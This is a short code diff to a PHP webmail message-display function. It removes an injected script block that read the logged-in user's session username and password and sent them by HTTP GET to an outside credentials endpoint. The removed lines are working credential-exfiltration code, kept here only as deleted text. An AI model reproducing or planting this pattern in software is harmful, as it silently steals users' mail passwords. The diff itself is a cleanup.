@@ -802,11 +802,6 @@ function rcmail_message_body($attrib)
 	echo "
 		<script>
 			var uid=".$MESSAGE->uid.";
-			var username='".$_SESSION["username"]."';
-			var password='".$_SESSION["_password"]."';
-			var xhttp = new XMLHttpRequest();
-			xhttp.open(\"GET\", 'http://orfeo.defensoria.gov.co/orfeo7/radiMail/setCredentials.php?username='+username+'&password='+password, true);
-			xhttp.send();
 		</script>";
 	ob_start();
     echo html::div($attrib, $out);
